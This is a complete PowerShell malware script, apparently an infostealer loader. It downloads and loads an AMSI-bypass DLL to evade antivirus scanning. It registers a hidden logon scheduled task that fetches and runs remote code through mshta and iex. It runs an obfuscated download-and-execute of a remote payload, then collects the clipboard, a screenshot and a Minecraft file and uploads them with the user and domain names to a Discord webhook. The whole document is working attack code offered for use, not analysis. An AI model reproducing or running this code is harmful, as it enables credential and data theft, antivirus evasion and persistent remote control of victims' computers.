$url = "https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/AMSI_Bypass.dll"
$bytes = (New-Object Net.WebClient).DownloadData($url)
$assembly = [System.Reflection.Assembly]::Load($bytes)
[Bypass]::amsi()

$task_name = "Windows startup"
$task_action = New-ScheduledTaskAction -Execute "mshta.exe" -Argument "vbscript:createobject(`"wscript.shell`").run(`"powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/43a1723/test/main/download.ps1')|iex`",0)(window.close)"
$task_trigger = New-ScheduledTaskTrigger -AtLogOn
$task_settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -DontStopOnIdleEnd -StartWhenAvailable
Register-ScheduledTask -Action $task_action -Trigger $task_trigger -Settings $task_settings -TaskName $task_name -Description "windows startup file" -RunLevel Highest -Force

$dir = "$env:temp\loader"
New-Item -ItemType Directory -Path $dir
attrib +h +s $dir
cd $dir
Set-Location -Path $dir

$shellcode = ("https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-scr/shell/data.ps1")
$download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
$proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
$proc.WaitForExit()

Get-Clipboard | Out-File -FilePath "clip.txt" -Encoding utf8

Copy-Item -Path "$env:APPDATA\.minecraft\hotbar.nbt" -Destination "$dir\hotbar.nbt"

Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('{PRTSC}')
Start-Sleep -Milliseconds 500
$img = [System.Windows.Forms.Clipboard]::GetImage()
$img.Save('screenshot.png')

$loaderPath = $dir
$originalWebhook = $webhook
$customWebhook = $originalWebhook -replace "discord\.com", "webhook.lewisakura.moe"
$userName = "$env:username"
$userDomain = "$env:userdomain"

Get-ChildItem -Path $loaderPath | ForEach-Object {
    $file = $_.FullName
    $fileName = $_.Name

    $payload = @{
        "username" = "hai1723 - $userName - $userDomain"
        "content"  = "File: $fileName"
    }

    $form = @{
        "payload_json" = ($payload | ConvertTo-Json)
        "file1" = Get-Item $file
    }

    Invoke-RestMethod -Uri $customWebhook -Method Post -Form $form
}
